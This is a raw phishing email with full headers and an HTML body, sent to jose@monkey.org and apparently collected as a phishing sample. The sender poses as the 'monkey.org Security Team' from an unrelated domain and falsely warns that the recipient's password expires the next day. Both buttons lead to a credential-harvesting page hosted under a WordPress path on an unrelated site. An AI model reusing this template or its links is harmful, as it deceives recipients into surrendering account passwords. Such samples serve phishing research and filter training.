@@ -1,0 +1,160 @@
+Return-Path: rhea@manhuasao.com
+Delivered-To: jose@monkey.org
+X-FDA: 83818968702.13.A0040E6
+Received: from dully.manhuasao.com (dully.manhuasao.com [86.106.104.242])
+	by imf04.b.hostedemail.com (Postfix) with ESMTP id B3B98160007
+	for <jose@monkey.org>; Tue, 26 Aug 2025 13:20:49 +0000 (UTC)
+Authentication-Results: imf04.b.hostedemail.com;
+	dkim=pass header.d=manhuasao.com header.s=dkim header.b=hzUt7zaf;
+	spf=pass (imf04.b.hostedemail.com: domain of rhea@manhuasao.com designates
+ 86.106.104.242 as permitted sender) smtp.mailfrom=rhea@manhuasao.com;
+	dmarc=pass (policy=none) header.from=manhuasao.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1756214449;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=X9ThMwwZhOtuLZVkvsg9tM9AWuVw2H4P+lDcB3ZIPPc=;
+	b=Tm4tEDS99ZJgLyjYElkB2JgHWSN9u2MTW1CT1rNP1j/T9E4kzqYf6rbr0++PwI1PLs5DTY
+	Sxf/5BW08rVyQE0AEIjGOs1EjPnfXTT/RWiXcNV94g/U//0WIVcb38RWTaQIf/cG5U8Vla
+	i3s+3m414U3MIA22+mX5Cm65HCAXkqY=
+ARC-Authentication-Results: i=1;
+	imf04.b.hostedemail.com;
+	dkim=pass header.d=manhuasao.com header.s=dkim header.b=hzUt7zaf;
+	spf=pass (imf04.b.hostedemail.com: domain of rhea@manhuasao.com designates
+ 86.106.104.242 as permitted sender) smtp.mailfrom=rhea@manhuasao.com;
+	dmarc=pass (policy=none) header.from=manhuasao.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1756214449; a=rsa-sha256;
+	cv=none;
+	b=jrXS0gc34akMnSlxsNbVRFzdZKjAteqno87aPe+6bbbUIrYX509///ZgXyAUJgS/cV0Tap
+	kb3XCruJnxec10UQW5baCenEuf5YjqvZFK0zStOv4Kfm/UKpMl18MNIo4yoBrUkSIersyU
+	diceHtFvljDgwRjDvy3EYsFJeiBM284=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=manhuasao.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=rhea@manhuasao.com;
+ bh=q2Dhd5bLPgy6TaZjKUT06x7BxQk=;
+ b=hzUt7zafuoYFIFu0gm0wbMyrLCE3xiehnp2Rq9/JHQU/GoApIhg4hLNVm9Johe1LqwP+6EZ0GCpI
+   KX6BBkr8iclIyoZcV/2yG6n4Yon1+vKhF/i/9prTjfFgMuAabIZo9tpR7BXVsQhKrws8AOoX+Ggx
+   opF5w3vBsEyWxCNKC1ltsWmVBlL6ro0s4IlhI9tL1CmYhWroYNn3zHpjVNsATZTPGO+FOBZRDhjc
+   44Z/KXWV+m7265iI8xkSdTU7aT6DzhfrTvEhr7pBr62EtrSSZLMjIoQxTP5Fdu0vPuoMhPuikyuZ
+   wjbWpArNMYFVGfn9N0sOhiJId5jrWEX9Xfgz/g==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=manhuasao.com;
+ b=k9Lqlh3cyyT3DWUMY+GfhwR6MQV/sy3DqLMZek6IVE5AlUe9VX6J2JIS8zxDP3OYG4ucD9Bl72Ms
+   nhNPuYCVgvQQTkYs3kEpUzX4fRGo6NkEy/nAbz7FAJebRTEBH9J3N6uu11DmvbzOCpM5FYe+XtMQ
+   MrmIEw9ja9jM+B/UiikfpYnvkADJM2U+i1oAQ9AMG6NTIoKqE7DILQUJeqnT2geZJSZMsMo932sy
+   MOrA7W7Hya/tbQaKGISRTX9o24p3Ju+4Hct8+LvyomgOtN08v4hs8Ss/p7ZV+PblqbST6oE2RR3M
+   DCzoUQ3GCUhgiMYtbo0ENLVO6b/6n7BI3IZ4iQ==;
+From: monkey.org <rhea@manhuasao.com>
+To: jose@monkey.org
+Subject: Password Authentication Required for jose@monkey.org
+Date: 25 Aug 2025 12:56:18 +0200
+Message-ID: <20250825125618.1035A12D4542E9A6@manhuasao.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=7.30
+X-Stat-Signature: sth4htewm9ue5oiawcbj779hysrhyhto
+X-Rspam-User: 
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: B3B98160007
+X-HE-Tag: 1756214449-728517
+X-HE-Meta: 
+ U2FsdGVkX18nUjyrtpLbB69nj31S/I3zlZHWIAKTL6V5CX3mYnFO4SH7nUbwOwq4KYxOWSjn0qZ3Omm8fS0FVf8P/AGI8XDTqcF4dmM8sL66rcSlvHGgMXSiL1tIicXMTnj6adOhQr+974YEmGVyqQlDpLVYNeaL68kBoHN4lEv3nZ5rRE0XeOMM1avpnf6Qr93t8Qk2JC7ZIaDLfrY7/kW/fGa/n8yygtp6LhAWuDgaDIaKusi4PQScfc6JgGGNvABxSw/puAE4nVkZwX4ZnLbWz3aLlYm0TC8PhkRbjc2CsCwAuFN6mKgXtyuTBQzMP8VRo+1A5xZX/Iv5agYxqJshVEIKwTStPzKX9YiAzCHyoB5TDgfra4ftPCaQU6kYsvDPrx0ASBLv99msePrv/kbGekbs7JDz8k2P6VH+Wl88rGHGZiWDTV5W5ud7pTCVfOVnNDUN4xk2eIYzAerpV9g8Zsz6VfuBbcq4xLH5gScXgowTTAewLHby4PLPy+29i+ZmPn9LXa7USoU2g5RRzexf7vSXnEabHChSL+VeO+Km3FGjwHLEtM2WVWXrbJIJ2a0hHfGvzYRGVVwxK3Bhk/02jiJ2RLsMfH0TRvjPL42vFE8EjlxTnKYF3ZCeVec+9duJNqCgfO2jRBGDpNHz74iiyTCu9FSvIajywBZQV0Se7MXbyGWpmgfIOaql8MU54zSlBzLo61zx2ccfGaNDqq9yjzabdnjjUj1JXU+6O1h1hSzhOjRKWRnOL05Frc9cOuItzXmzYj6a/m3YB+v08bQjiFNJEylikmbBaRU562f+WmnA40JwduPMQ23kOAfBXW1EKkccoQtHFh+us212eWbder7sE8AHDDISkpCVjHD5Wt3Q8HUc7W+aXOnyeCvli5/bttTmwTddOeeEaFo3Rodx+BBNYVpysFK0jVr1s1ufsX8ueOhn1PJXFmQfWljvq8h2w2VTfuPHZXdNdnS4QPxvkkt
+ qXinwXVslq0GzwG6NdAWRjJ/D7p98tmbOAt76ROtxdkfce8DJf8LUUV73ADMC2rQ1RYbjLImY7a7E6NRQxnpVhoIIRfW155oxP3p3+12R2JwSKXZbcFxQ6P3ScDyLW8P4ozGRhkwWCf5bxLNJCsAaiIR3wYSd9LCi1Y8O71YRzAk5cwUA8SZeXg9FILv289aGRwrVNcGnfxaIueYqXk0wtB4yHvMwZLbKUZD1ZqymTi2jRngFVyysJcjBpA==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 342
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"600" style=3D'padding: 20px !important; border-radius: 10px=
+; width: 384px; color: rgb(205, 205, 205); text-transform: none; letter-spa=
+cing: normal; font-family: "vk sans display", system-ui; font-size: 17px; f=
+ont-style: normal; font-weight: 400; text-decoration: none; word-spacing: 0=
+px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(25, 2=
+5, 25); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
+text-stroke-width: 0px;' border=3D"0" cellspacing=3D"0"=20
+cellpadding=3D"0"><tbody><tr style=3D'color: rgb(205, 205, 205); font-famil=
+y: "vk sans display", system-ui;'><td style=3D'border-color: rgb(38, 112, 2=
+36); margin: 0px; padding: 30px 40px; text-align: center; color: rgb(255, 2=
+55, 255); font-family: "vk sans display", system-ui; white-space: normal; b=
+ackground-color: rgb(38, 112, 236);'><h1 style=3D'border-color: rgb(25, 25,=
+ 25); margin: 0px; font-family: "vk sans display", system-ui; font-size: 24=
+px;'>
+<font face=3D".AppleColorEmojiUI" size=3D"4"><font face=3D".AppleColorEmoji=
+UI" size=3D"4"><p>&#9888;&#65039;&nbsp;Account Security Alert</p></font></f=
+ont></h1><p style=3D'border-color: rgb(25, 25, 25); margin: 10px 0px 0px; f=
+ont-family: "vk sans display", system-ui; font-size: 16px;'>Password Expiry=
+ Notification</p></td></tr>
+<tr style=3D'color: rgb(205, 205, 205); font-family: "vk sans display", sys=
+tem-ui;'><td style=3D'margin: 0px; padding: 30px 40px; color: rgb(205, 205,=
+ 205); font-family: "vk sans display", system-ui; white-space: normal;'><p =
+style=3D'margin: 0px 0px 20px; color: rgb(205, 205, 205); line-height: 1.6;=
+ font-family: "vk sans display", system-ui; font-size: 16px;'></p><p style=
+=3D'color: rgb(205, 205, 205); font-family: "vk sans display", system-ui;'>=
+
+Hello&nbsp;jose@monkey.org&nbsp;,</p><p style=3D'color: rgb(205, 205, 205);=
+ font-family: "vk sans display", system-ui;'></p>
+<p style=3D'margin: 0px 0px 20px; color: rgb(205, 205, 205); line-height: 1=
+=2E6; font-family: "vk sans display", system-ui; font-size: 16px;'><br>This=
+ is a reminder that your password&nbsp;is set to&nbsp;expire on&nbsp;<stron=
+g style=3D'color: rgb(205, 205, 205); font-family: "vk sans display", syste=
+m-ui;'>26 Aug 2025</strong>.<br> To keep your account secure and avoid inte=
+rruptions, we recommend taking action below.</p>
+<table align=3D"center" style=3D'margin: 30px 0px; color: rgb(205, 205, 205=
+); font-family: "vk sans display", system-ui;' border=3D"0" cellspacing=3D"=
+0" cellpadding=3D"0"><tbody style=3D'color: rgb(205, 205, 205); font-family=
+: "vk sans display", system-ui;'><tr style=3D'color: rgb(205, 205, 205); fo=
+nt-family: "vk sans display", system-ui;'>
+<td align=3D"center" style=3D'margin: 0px; border-radius: 6px; color: rgb(2=
+05, 205, 205); font-family: "vk sans display", system-ui; white-space: norm=
+al; background-color: rgb(38, 112, 236);' bgcolor=3D"#2670ec">
+<a style=3D'border-color: rgb(25, 25, 25); padding: 14px 28px; color: rgb(2=
+55, 255, 255); font-family: "vk sans display", system-ui; font-size: 16px; =
+font-weight: bold; text-decoration: none; display: inline-block;' href=3D"h=
+ttps://cheshiremaintenance.com/wp-includes/ssl/aadd.php#jose@monkey.org" ta=
+rget=3D"_blank"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cbjingu.com/=
+tumyyweb/web/contodomain/allweb/onprocesss/twebmail.html%23sales11@supremeg=
+eotech.com&amp;source=3Dgmail&amp;ust=3D1756203198853000&amp;usg=3DAOvVaw1i=
+0WOIRCxM-R5KCFVIaXMp">Keep Current Password</a>&nbsp;</td></tr></tbody></ta=
+ble><p style=3D'text-align: center; color: rgb(172, 172, 172); font-family:=
+ "vk sans display", system-ui; font-size: 15px;'>Or, if you'd prefer to cha=
+nge your password at a later time:</p>
+<table align=3D"center" style=3D'margin: 20px 0px; color: rgb(205, 205, 205=
+); font-family: "vk sans display", system-ui;' border=3D"0" cellspacing=3D"=
+0" cellpadding=3D"0"><tbody style=3D'color: rgb(205, 205, 205); font-family=
+: "vk sans display", system-ui;'><tr style=3D'color: rgb(205, 205, 205); fo=
+nt-family: "vk sans display", system-ui;'><td align=3D"center" style=3D'mar=
+gin: 0px; border-radius: 6px; color: rgb(205, 205, 205); font-family: "vk s=
+ans display", system-ui; white-space: normal;' bgcolor=3D"#444444">
+<a style=3D'border-color: rgb(25, 25, 25); padding: 12px 24px; color: rgb(2=
+55, 255, 255); font-family: "vk sans display", system-ui; font-size: 15px; =
+font-weight: normal; text-decoration: none; display: inline-block;' href=3D=
+"https://cheshiremaintenance.com/wp-includes/ssl/aadd.php#jose@monkey.org" =
+target=3D"_blank"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cbjingu.com/=
+tumyyweb/web/contodomain/allweb/onprocesss/twebmail.html%23sales11@supremeg=
+eotech.com&amp;source=3Dgmail&amp;ust=3D1756203198853000&amp;usg=3DAOvVaw1i=
+0WOIRCxM-R5KCFVIaXMp">Change Password in One Month</a>&nbsp;</td></tr></tbo=
+dy></table><p style=3D'border-color: rgb(25, 25, 25); color: rgb(153, 153, =
+153); line-height: 1.6; font-family: "vk sans display", system-ui; font-siz=
+e: 14px; margin-top: 30px;'>
+<strong style=3D'border-color: rgb(25, 25, 25); font-family: "vk sans displ=
+ay", system-ui;'>Note:</strong>&nbsp;If no action is taken, access to your =
+email or account services may be disrupted.</p><p style=3D'border-color: rg=
+b(25, 25, 25); color: rgb(153, 153, 153); line-height: 1.6; font-family: "v=
+k sans display", system-ui; font-size: 14px; margin-top: 20px;'>Thank you,<=
+br style=3D"border-color: rgb(25, 25, 25) !important;">
+<strong style=3D'border-color: rgb(25, 25, 25); font-family: "vk sans displ=
+ay", system-ui;'>monkey.org&nbsp;Security Team</strong>
+<br style=3D"border-color: rgb(25, 25, 25) !important;">2025</p></td></tr><=
+tr style=3D'color: rgb(205, 205, 205); font-family: "vk sans display", syst=
+em-ui;'></tr></tbody></table><p><br class=3D"Apple-interchange-newline"></p=
+></body></html>
+
